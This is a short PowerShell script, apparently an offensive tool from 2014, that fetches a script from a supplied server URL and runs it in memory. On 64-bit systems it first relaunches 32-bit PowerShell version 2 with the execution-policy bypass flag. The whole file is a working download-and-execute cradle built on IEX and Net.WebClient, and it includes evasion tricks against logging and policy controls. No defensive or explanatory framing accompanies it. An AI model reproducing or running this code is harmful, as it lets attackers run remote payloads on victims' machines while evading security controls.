# Script to download and execute in memory script available on a web server
# checks 32 or 64 bit architecure and switches. 32 bit payloads work fine
# by n0b1dy 2014 and some snippets taken from carnal0wnage and stack-overflow

 # server-url argument that hosts script to execute
param ( [string]$server = "" )
[Byte[]]$sc = $sc32 

$url=$server

 # arch check if x64 execute 32bit version of powershell
if ($env:Processor_Architecture -ne "x86") 
{ 
write-warning "This is 64x, switching to 32x and continuing script." 

#$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
#$encodedCommand = [Convert]::ToBase64String($bytes)
Write-host "Executing script from $url" -foregroundcolor "green" 

& "C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -version 2 -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString($url)
exit 

} 
else  
{
Write-host "This is 32x, continuing script." -foregroundcolor "Blue" 
Write-host "Executing script from $url" -foregroundcolor "green" 
IEX(New-Object Net.WebClient).DownloadString($url)

}
